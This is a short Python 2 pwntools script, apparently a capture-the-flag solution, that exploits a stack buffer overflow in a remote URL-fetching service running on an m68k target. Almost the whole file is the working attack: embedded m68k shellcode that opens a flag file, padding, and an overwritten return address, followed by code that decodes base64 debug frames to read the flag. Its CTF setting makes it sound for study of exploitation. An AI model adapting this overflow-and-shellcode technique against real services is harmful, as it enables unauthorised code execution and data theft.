#!/usr/bin/env python2

# Just a super simple frontend for me to test the service (manually)
from pwn import *
context.log_level = 'debug'
context.arch = 'm68k'

import sys
import re
import os
import PIL.Image
import base64
import StringIO

def main():
    if len(sys.argv) != 3:
        print "usage: exploit.py <ip> <port>"
        sys.exit(-1)
    
    ip = sys.argv[1]
    port = sys.argv[2]

    conn = remote(ip, port)

    print conn.recvuntil("What URL would you like this old dog to fetch?")

    # Prefix is "GET /aaa"
    prefix_size = 8

    # Flag is in /me/flag

    payload = "http://example.com/aaa"

    shellcode = "\xb7\x83\x2f\x03\x2f\x3c\x6f\x70\x65\x6e\x2f\x3c\x62\x69\x6e\x2f\x2f\x3c\x75\x73\x72\x2f\x2f\x3c\x2f\x2f\x2f\x2f\x22\x0f\x2f\x03\x2f\x3c\x66\x6c\x61\x67\x2f\x3c\x2f\x6d\x65\x2f\x28\x0f\x2f\x03\x2f\x04\x2f\x01\x24\x0f\x70\x3b\x4e\x44"

    payload += shellcode

    payload += 'a' * (258 - prefix_size - len(shellcode))

    payload += 'bcde'

    addr = p32(0x03fff786 + prefix_size)

    payload += addr

    conn.sendline(payload)

    print conn.recvuntil("Booting up")

    img = None
    try:
        while True:
            response = conn.recvline()

            if response.startswith("DEBUG"):
                img_b64 = response[6:]
                img = base64.b64decode(img_b64)
                io = StringIO.StringIO()
                io.write(img)
                io.seek(0)

                i = PIL.Image.open(io)
                i.show()
            else:
                print response
    except EOFError:
        # try to extract the flag from the last image
        print "In the last frame, extract that flag!"
        


if __name__ == '__main__':
    main()

